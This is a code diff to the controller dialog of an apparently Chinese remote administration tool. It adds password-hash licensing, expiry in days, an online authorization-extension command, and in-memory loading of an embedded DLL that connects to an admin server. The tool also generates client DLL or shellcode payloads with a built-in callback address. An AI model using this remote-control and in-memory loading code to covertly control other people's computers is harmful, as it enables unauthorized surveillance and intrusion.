@@ -36,13 +36,10 @@
 #include "Chat.h"
 #include "DecryptDlg.h"
 #include "adapter.h"
+#include "client/MemoryModule.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
-#endif
-
-#ifndef GET_FILEPATH
-#define GET_FILEPATH(dir,file) [](char*d,const char*f){char*p=d;while(*p)++p;while('\\'!=*p&&p!=d)--p;strcpy(p+1,f);return d;}(dir,file)
 #endif
 
 #define UM_ICONNOTIFY WM_USER+100
@@ -283,6 +280,7 @@ CMy2015RemoteDlg::CMy2015RemoteDlg(IOCPServer* iocpServer, CWnd* pParent): CDial
 	m_bmOnline[7].LoadBitmap(IDB_BITMAP_GDESKTOP);
 	m_bmOnline[8].LoadBitmap(IDB_BITMAP_DDESKTOP);
 	m_bmOnline[9].LoadBitmap(IDB_BITMAP_SDESKTOP);
+	m_bmOnline[10].LoadBitmap(IDB_BITMAP_AUTHORIZE);
 
 	for (int i = 0; i < PAYLOAD_MAXTYPE; i++) {
 		m_ServerDLL[i] = nullptr;
@@ -296,6 +294,7 @@ CMy2015RemoteDlg::CMy2015RemoteDlg(IOCPServer* iocpServer, CWnd* pParent): CDial
 	GetModuleFileNameA(NULL, path, _MAX_PATH);
 	GET_FILEPATH(path, "Plugins");
 	m_DllList = ReadAllDllFilesWindows(path);
+	m_tinyDLL = NULL;
 }
 
 
@@ -309,6 +308,10 @@ CMy2015RemoteDlg::~CMy2015RemoteDlg()
 	for (int i = 0; i < m_DllList.size(); i++)
 	{
 		SAFE_DELETE(m_DllList[i]);
+	}
+	if (m_tinyDLL) {
+		MemoryFreeLibrary(m_tinyDLL);
+		m_tinyDLL = NULL;
 	}
 }
 
@@ -382,6 +385,8 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 	ON_COMMAND(ID_ONLINE_GRAY_DESKTOP, &CMy2015RemoteDlg::OnOnlineGrayDesktop)
 	ON_COMMAND(ID_ONLINE_REMOTE_DESKTOP, &CMy2015RemoteDlg::OnOnlineRemoteDesktop)
 	ON_COMMAND(ID_ONLINE_H264_DESKTOP, &CMy2015RemoteDlg::OnOnlineH264Desktop)
+	ON_COMMAND(ID_WHAT_IS_THIS, &CMy2015RemoteDlg::OnWhatIsThis)
+	ON_COMMAND(ID_ONLINE_AUTHORIZE, &CMy2015RemoteDlg::OnOnlineAuthorize)
 END_MESSAGE_MAP()
 
 
@@ -694,6 +699,7 @@ Buffer* ReadKernelDll(bool is64Bit, bool isDLL=true, const std::string &addr="")
 			CONNECT_ADDRESS* server = (CONNECT_ADDRESS*)(szBuffer + offset);
 			server->SetServer(ip.c_str(), atoi(port.c_str()));
 			server->SetType(isDLL ? CLIENT_TYPE_MEMDLL : CLIENT_TYPE_SHELLCODE);
+			memcpy(server->pwdHash, GetPwdHash().c_str(), 64);
 		}
 	}
 	auto ret = new Buffer(szBuffer, bufSize + padding, padding, md5);
@@ -734,9 +740,30 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 		}
 	}
 	// 主控程序公网IP
-	std::string master = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "master", "");
-	if (!master.empty()) {
-		master += ":" + ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "ghost", "6543");
+	std::string ip = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "master", "");
+	std::string port = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "ghost", "6543");
+	std::string master = ip.empty() ? "" : ip + ":" + port;
+	const Validation* v = GetValidation();
+	m_superPass = v->Reserved;
+#ifdef _DEBUG
+	if (!(strlen(v->Admin) && v->Port > 0)) {
+		static Validation test(1, ip.c_str(), atoi(port.c_str()));
+		v = &test;
+	}
+#endif
+	if (strlen(v->Admin) && v->Port > 0) {
+		DWORD size = 0;
+		LPBYTE data = ReadResource(sizeof(void*) == 8 ? IDR_TINYRUN_X64 : IDR_TINYRUN_X86, size);
+		if (data) {
+			int offset = MemoryFind((char*)data, FLAG_FINDEN, size, strlen(FLAG_FINDEN));
+			if (offset != -1) {
+				CONNECT_ADDRESS* p = (CONNECT_ADDRESS*)(data + offset);
+				p->SetServer(v->Admin, v->Port);
+				memcpy(p->pwdHash, GetPwdHash().c_str(), 64);
+				m_tinyDLL = MemoryLoadLibrary(data, size);
+			}
+			SAFE_DELETE_ARRAY(data);
+		}
 	}
 	m_ServerDLL[PAYLOAD_DLL_X86] = ReadKernelDll(false, true, master);
 	m_ServerDLL[PAYLOAD_DLL_X64] = ReadKernelDll(true, true, master);
@@ -908,10 +935,15 @@ void CMy2015RemoteDlg::OnTimer(UINT_PTR nIDEvent)
 		{
 			KillTimer(nIDEvent);
 			CInputDialog dlg(this);
+			dlg.m_str = m_superPass.c_str();
 			dlg.Init("输入密码", "输入主控程序的密码:");
 			dlg.DoModal();
-			if (hashSHA256(dlg.m_str.GetString()) != std::string(skCrypt(MASTER_HASH)))
+			if (hashSHA256(dlg.m_str.GetString()) != GetPwdHash()) {
+				MessageBox("请通知管理员延长授权时间，再关闭此提示信息!!!"
+					"\n否则，关闭此提示信息将退出程序，无法授权成功。", "提示", MB_ICONWARNING);
 				return OnMainExit();
+			}
+			m_superPass = dlg.m_str.GetString();
 			MessageBox("请及时对当前主控程序授权: 在工具菜单中生成口令!", "提示", MB_ICONWARNING);
 		}
 	}
@@ -1024,6 +1056,7 @@ void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
 	Menu.SetMenuItemBitmaps(ID_ONLINE_GRAY_DESKTOP, MF_BYCOMMAND, &m_bmOnline[7], &m_bmOnline[7]);
 	Menu.SetMenuItemBitmaps(ID_ONLINE_REMOTE_DESKTOP, MF_BYCOMMAND, &m_bmOnline[8], &m_bmOnline[8]);
 	Menu.SetMenuItemBitmaps(ID_ONLINE_H264_DESKTOP, MF_BYCOMMAND, &m_bmOnline[9], &m_bmOnline[9]);
+	Menu.SetMenuItemBitmaps(ID_ONLINE_AUTHORIZE, MF_BYCOMMAND, &m_bmOnline[10], &m_bmOnline[10]);
 
 	// 创建一个新的子菜单
 	CMenu newMenu;
@@ -1053,6 +1086,9 @@ void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
 		{
 			SubMenu->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //菜单全部变灰
 		}
+	}
+	else if (GetPwdHash() != std::string(skCrypt(MASTER_HASH))) {
+		SubMenu->EnableMenuItem(ID_ONLINE_AUTHORIZE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
 	}
 
 	// 刷新菜单显示
@@ -1245,6 +1281,14 @@ bool CMy2015RemoteDlg::CheckValid() {
 #endif
 
 	if (!isTrail) {
+		const Validation *verify = GetValidation();
+		std::string masterHash = skCrypt(MASTER_HASH);
+		if (masterHash != GetPwdHash() && !verify->IsValid()) {
+			KillTimer(TIMER_CHECK);
+			MessageBox("此程序已经失效，请联系管理员处理!", "提示", MB_ICONWARNING);
+			OnMainExit();
+			ExitProcess(-1);
+		}
 		auto THIS_APP = (CMy2015RemoteApp*)AfxGetApp();
 		auto settings = "settings", pwdKey = "Password";
 		// 验证口令
@@ -1256,8 +1300,10 @@ bool CMy2015RemoteDlg::CheckValid() {
 
 		dlg.m_sDeviceID = deviceID.c_str();
 		dlg.m_sPassword = pwd;
-		if (pwd.IsEmpty() && IDOK != dlg.DoModal() || dlg.m_sPassword.IsEmpty())
+		if (pwd.IsEmpty() && IDOK != dlg.DoModal() || dlg.m_sPassword.IsEmpty()) {
+			KillTimer(TIMER_CHECK);
 			return false;
+		}
 
 		// 密码形式：20250209 - 20350209: SHA256
 		auto v = splitString(dlg.m_sPassword.GetBuffer(), '-');
@@ -1265,6 +1311,7 @@ bool CMy2015RemoteDlg::CheckValid() {
 		{
 			THIS_APP->m_iniFile.SetStr(settings, pwdKey, "");
 			MessageBox("格式错误，请重新申请口令!", "提示", MB_ICONINFORMATION);
+			KillTimer(TIMER_CHECK);
 			return false;
 		}
 		std::vector<std::string> subvector(v.begin() + 2, v.end());
@@ -1277,6 +1324,7 @@ bool CMy2015RemoteDlg::CheckValid() {
 			if (pwd.IsEmpty() || (IDOK != dlg.DoModal() || hash256 != fixedKey)) {
 				if (!dlg.m_sPassword.IsEmpty())
 					MessageBox("口令错误, 无法继续操作!", "提示", MB_ICONWARNING);
+				KillTimer(TIMER_CHECK);
 				return false;
 			}
 		}
@@ -1287,6 +1335,7 @@ bool CMy2015RemoteDlg::CheckValid() {
 		if (curDate < v[0] || curDate > v[1]) {
 			THIS_APP->m_iniFile.SetStr(settings, pwdKey, "");
 			MessageBox("口令过期，请重新申请口令!", "提示", MB_ICONINFORMATION);
+			KillTimer(TIMER_CHECK);
 			return false;
 		}
 		if (dlg.m_sPassword != pwd)
@@ -1655,6 +1704,22 @@ LRESULT CMy2015RemoteDlg::OnHandleMessage(WPARAM wParam, LPARAM lParam) {
 	return S_OK;
 }
 
+std::string getDateStr(int daysOffset = 0) {
+	// 获取当前时间点
+	std::time_t now = std::time(nullptr);
+
+	// 加上指定的天数（可以为负）
+	now += static_cast<std::time_t>(daysOffset * 24 * 60 * 60);
+
+	std::tm* t = std::localtime(&now);
+
+	std::ostringstream oss;
+	oss << std::setfill('0') << std::setw(4) << (t->tm_year + 1900)
+		<< std::setw(2) << (t->tm_mon + 1)
+		<< std::setw(2) << t->tm_mday;
+
+	return oss.str();
+}
 
 VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject) 
 {
@@ -1675,6 +1740,23 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 		memcpy(resp+1+sizeof(DllSendData), bin->c_str() + 6, dll.DataSize);
 		m_iocpServer->OnClientPreSending(ContextObject, resp, 1 + sizeof(DllSendData) + dll.DataSize);
 		SAFE_DELETE_ARRAY(resp);
+		break;
+	}
+	case CMD_AUTHORIZATION: // 获取授权
+	{
+		int n = ContextObject->InDeCompressedBuffer.GetBufferLength();
+		if (n < 100) break;
+		char resp[100] = { 0 }, *devId = resp + 5, *pwdHash = resp + 32;
+		ContextObject->InDeCompressedBuffer.CopyBuffer(resp, min(n, sizeof(resp)), 0);
+		int *days = (int*)(resp+1);
+		if (devId[0] == 0 || pwdHash[0] == 0)break;
+		// 密码形式：20250209 - 20350209: SHA256
+		std::string password = getDateStr(0) + " - " + getDateStr(*days) + ": " + pwdHash;
+		std::string finalKey = deriveKey(password, devId);
+		std::string fixedKey = getDateStr(0) + std::string("-") + getDateStr(*days) + std::string("-") + getFixedLengthID(finalKey);
+		memcpy(devId, fixedKey.c_str(), fixedKey.length());
+		devId[fixedKey.length()] = 0;
+		m_iocpServer->OnClientPreSending(ContextObject, (LPBYTE)resp, sizeof(resp));
 		break;
 	}
 	case CMD_EXECUTE_DLL: // 请求DLL
@@ -2341,6 +2423,7 @@ void CMy2015RemoteDlg::OnToolAuth()
 	std::string hashedID = hashSHA256(hardwareID);
 	std::string deviceID = getFixedLengthID(hashedID);
 	dlg.m_sDeviceID = deviceID.c_str();
+	dlg.m_sUserPwd = m_superPass.c_str();
 
 	dlg.DoModal();
 }
@@ -2548,19 +2631,37 @@ LRESULT CMy2015RemoteDlg::UPXProcResult(WPARAM wParam, LPARAM lParam) {
 
 void CMy2015RemoteDlg::OnToolGenMaster()
 {
-	CInputDialog pass(this);
-	pass.Init("主控生成", "当前主控程序的密码:");
-	if (pass.DoModal() != IDOK || pass.m_str.IsEmpty())
-		return;
+	// 主控程序公网IP
+	std::string master = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "master", "");
+	if (master.empty())	{
+		MessageBox("请通过菜单设置当前主控程序的公网地址（域名）! 此地址会写入即将生成的主控程序中。"
+			"\n只有正确设置公网地址，才能在线延长由本程序所生成的主控程序的有效期。", "提示", MB_ICONINFORMATION);
+	}
 	std::string masterHash(skCrypt(MASTER_HASH));
-	if (hashSHA256(pass.m_str.GetBuffer()) != masterHash) {
-		MessageBox("密码不正确，无法生成主控程序!", "错误", MB_ICONWARNING);
-		return;
+	if (m_superPass.empty()) {
+		CInputDialog pass(this);
+		pass.Init("主控生成", "当前主控程序的密码:");
+		pass.m_str = m_superPass.c_str();
+		if (pass.DoModal() != IDOK || pass.m_str.IsEmpty())
+			return;
+		if (hashSHA256(pass.m_str.GetBuffer()) != masterHash) {
+			MessageBox("密码不正确，无法生成主控程序!", "错误", MB_ICONWARNING);
+			return;
+		}
+		m_superPass = pass.m_str.GetString();
 	}
 
 	CInputDialog dlg(this);
 	dlg.Init("主控密码", "新的主控程序的密码:");
 	if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty())
+		return;
+	if (dlg.m_str.GetLength() > 15) {
+		MessageBox("密码长度不能大于15。", "错误", MB_ICONWARNING);
+		return;
+	}
+	CInputDialog days(this);
+	days.Init("使用天数", "新主控程序使用天数:");
+	if (days.DoModal() != IDOK || days.m_str.IsEmpty())
 		return;
 	size_t size = 0;
 	char path[MAX_PATH];
@@ -2594,7 +2695,9 @@ void CMy2015RemoteDlg::OnToolGenMaster()
 			return;
 		}
 	}
-	if (!WritePwdHash(curEXE + iOffset, pwdHash)) {
+	int port = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "ghost");
+	Validation verify(atof(days.m_str), master.c_str(), port<=0 ? 6543 : port);
+	if (!WritePwdHash(curEXE + iOffset, pwdHash, verify)) {
 		MessageBox("写入哈希失败! 无法生成主控。", "错误", MB_ICONWARNING);
 		SAFE_DELETE_ARRAY(curEXE);
 		return;
@@ -2702,5 +2805,38 @@ void CMy2015RemoteDlg::OnOnlineRemoteDesktop()
 void CMy2015RemoteDlg::OnOnlineH264Desktop()
 {
 	BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 0, ALGORITHM_H264 };
+	SendSelectedCommand(bToken, sizeof(bToken));
+}
+
+
+void CMy2015RemoteDlg::OnWhatIsThis()
+{
+	CString url = _T("https://github.com/yuanyuanxiang/SimpleRemoter/wiki");
+	ShellExecute(NULL, _T("open"), url, NULL, NULL, SW_SHOWNORMAL);
+}
+
+
+void CMy2015RemoteDlg::OnOnlineAuthorize()
+{
+	if (m_superPass.empty()) {
+		CInputDialog pass(this);
+		pass.Init("需要密码", "当前主控程序的密码:");
+		if (pass.DoModal() != IDOK || pass.m_str.IsEmpty())
+			return;
+		std::string masterHash(skCrypt(MASTER_HASH));
+		if (hashSHA256(pass.m_str.GetBuffer()) != masterHash) {
+			MessageBox("密码不正确!", "错误", MB_ICONWARNING);
+			return;
+		}
+		m_superPass = pass.m_str;
+	}
+
+	CInputDialog dlg(this);
+	dlg.Init("延长授权", "主控程序授权天数:");
+	if (dlg.DoModal() != IDOK || atoi(dlg.m_str) <= 0)
+		return;
+	BYTE	bToken[32] = { CMD_AUTHORIZATION };
+	int days = atoi(dlg.m_str);
+	memcpy(bToken+1, &days, sizeof(days));
 	SendSelectedCommand(bToken, sizeof(bToken));
 }
